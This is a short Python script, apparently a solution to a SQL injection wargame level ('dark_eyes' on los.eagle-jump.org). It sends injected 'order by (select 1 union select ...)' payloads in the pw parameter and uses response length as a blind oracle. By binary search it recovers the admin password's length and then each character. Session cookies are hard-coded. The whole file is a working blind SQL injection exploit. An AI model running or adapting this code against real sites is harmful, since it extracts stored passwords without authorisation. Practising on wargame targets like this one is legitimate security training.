import requests

def password_length():
	length=0
	while 1:
		length += 1
		query_add = query+"?pw=' or id='admin' order by (select 1 union select length(pw)="+str(length)+") --%20" 
		result=requests.get(query_add, cookies=cookie)
		if(len(result.text)>1000):
			print("Length is : "+str(length))
			return length

def password(index):
	first=0
	last=255
	while(first<last):
		mid=(first+last)//2
		query_add = query+"?pw=' or id='admin' order by (select 1 union select ord(substr(pw,+"+str(index)+",1))>"+str(mid)+") --%20"
		result=requests.get(query_add, cookies=cookie)
		#print(first, last, len(result.text))
		if(len(result.text)>1000):
			first=mid+1
			if(last==first+1):
				#order by(select 1 union select true)=> 1 column : no error
				#order by(select 1 union select false) => 2 columns : error
				query_add = query+"?pw=' or id='admin' order by (select 1 union select ord(substr(pw,+"+str(index)+",1))="+str(first)+") --%20"
				result=requests.get(query_add, cookies=cookie)
				if(len(result.text)>1000):	
					return first
				else:
					return last
		else:
			last=mid
	
	return first

if(__name__=="__main__"):
	cookie={"__cfduid":"d5fd3bf70d66481907d3d06087b88ff011549863094","PHPSESSID":"afuov7bqip2lbk1o06n42o7g45"}
	query='https://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php'
	#print(result.text.find("Hello"))
	length=password_length()
	for i in range(1, length+1):
		print(chr(password(i)),end="")